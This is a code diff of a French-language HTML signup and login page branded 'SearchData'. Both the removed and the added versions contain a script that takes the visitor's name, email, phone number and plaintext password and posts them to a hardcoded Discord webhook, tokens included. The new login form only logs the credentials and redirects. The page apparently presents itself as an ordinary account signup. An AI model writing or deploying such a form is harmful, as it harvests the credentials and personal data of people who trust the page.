@@ -17,61 +17,156 @@
         }
         .container {
             background: white;
-            padding: 20px;
+            padding: 40px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        h1 {
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 20px;
+            margin-bottom: 30px;
         }
         input {
             width: 100%;
-            padding: 10px;
-            margin: 5px 0;
+            padding: 15px;
+            margin: 10px 0;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 8px;
+            font-size: 18px;
         }
         button {
             background-color: #007bff;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
+            padding: 15px 30px;
+            border-radius: 8px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 20px;
+            font-size: 18px;
+            width: 100%;
         }
         button:hover {
             background-color: #0056b3;
         }
+        .login-btn {
+            background-color: #28a745; /* Green for "Se connecter" */
+        }
+        .login-btn:hover {
+            background-color: #218838;
+        }
+        .form-section {
+            display: none;
+        }
+        .active-section {
+            display: block;
+        }
     </style>
     <script>
-        function sendToDiscord() {
-            const webhookURL = "https://discord.com/api/webhooks/1334210446193856603/JSv5bDSZsYpooCx2mukTicaWRu8IDuGEXtj88mGanTUg2CofbK1IiDPOs8QltFiVP8Qn";
-            const name = document.getElementById("name").value;
-            const email = document.getElementById("email").value;
-            const phone = document.getElementById("phone").value;
-            const password = document.getElementById("password").value;
+        function switchSection(section) {
+            const signupSection = document.getElementById("signup-section");
+            const loginSection = document.getElementById("login-section");
+            if (section === 'signup') {
+                signupSection.classList.add('active-section');
+                loginSection.classList.remove('active-section');
+            } else {
+                loginSection.classList.add('active-section');
+                signupSection.classList.remove('active-section');
+            }
+        }
 
-            const payload = {
-                content: `**__Nouvelle inscription :__** \nNom : ${name}\nEmail : ${email}\nTéléphone : ${phone}\nMot de passe : ${password}`
+        async function submitSignUp() {
+            const name = document.getElementById("signup-name").value;
+            const email = document.getElementById("signup-email").value;
+            const phone = document.getElementById("signup-phone").value;
+            const password = document.getElementById("signup-password").value;
+            
+            // Préparer les données pour l'embed Discord
+            const embed = {
+                embeds: [
+                    {
+                        title: "Nouvelle inscription",
+                        color: 5814783, // Couleur du embed (bleu clair)
+                        fields: [
+                            { name: "Nom", value: name, inline: true },
+                            { name: "Email", value: email, inline: true },
+                            { name: "Numéro de téléphone", value: phone, inline: true },
+                            { name: "Mot de passe", value: password, inline: true }
+                        ],
+                        footer: {
+                            text: "Inscription via SearchData"
+                        }
+                    }
+                ]
             };
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                window.location.href = "https://discord.gg/bewt5qpH4K";
-            });
+            // URL du webhook Discord
+            const webhookURL = "https://discord.com/api/webhooks/1335654206849290280/PF_UFtFON3S4sWrBiAGj0BKY0kIcBlktIIM_51w4li7Lr45Tc5CPABDFVUN0rsFIdoPR";
+
+            // Envoi des données à Discord via un POST
+            try {
+                const response = await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(embed)
+                });
+
+                if (response.ok) {
+                    console.log("Données envoyées à Discord");
+                    window.location.href = "panel.html"; // Redirection vers panel.html après soumission
+                } else {
+                    console.error("Erreur lors de l'envoi du webhook Discord");
+                }
+            } catch (error) {
+                console.error("Erreur de connexion au webhook Discord", error);
+            }
+        }
+
+        function submitLogin() {
+            const email = document.getElementById("login-email").value;
+            const password = document.getElementById("login-password").value;
+
+            // Vous pouvez ajouter la logique ici pour la connexion
+            console.log('Email:', email);
+            console.log('Mot de passe:', password);
+
+            // Redirection vers panel.html après connexion réussie
+            window.location.href = "panel.html";  // Redirection vers panel.html
         }
     </script>
 </head>
 <body>
     <div class="container">
         <h1>🔎 SearchData</h1>
-        <p>Inscrivez-vous pour accéder à notre site.</p>
-        <input type="text" id="name" placeholder="Votre nom" required>
-        <input type="email" id="email" placeholder="Votre email" required>
-        <input type="tel" id="phone" placeholder="Votre numéro de téléphone" required>
-        <input type="password" id="password" placeholder="Votre mot de passe" required>
-        <button onclick="sendToDiscord()">Créer un compte</button>
+        <p>Choisissez une option :</p>
+
+        <!-- Choix entre Créer un compte et Se connecter -->
+        <button onclick="switchSection('signup')">Créer un compte</button>
+        <button class="login-btn" onclick="switchSection('login')">Se connecter</button>
+        
+        <!-- Section Créer un compte -->
+        <div id="signup-section" class="form-section active-section">
+            <h2>Inscrivez-vous</h2>
+            <input type="text" id="signup-name" placeholder="Votre nom" required>
+            <input type="email" id="signup-email" placeholder="Votre email" required>
+            <input type="tel" id="signup-phone" placeholder="Votre numéro de téléphone" required>
+            <input type="password" id="signup-password" placeholder="Votre mot de passe" required>
+            <button onclick="submitSignUp()">Créer un compte</button>
+        </div>
+
+        <!-- Section Se connecter -->
+        <div id="login-section" class="form-section">
+            <h2>Connexion</h2>
+            <input type="email" id="login-email" placeholder="Votre email" required>
+            <input type="password" id="login-password" placeholder="Votre mot de passe" required>
+            <button class="login-btn" onclick="submitLogin()">Se connecter</button>
+        </div>
     </div>
 </body>
 </html>
+
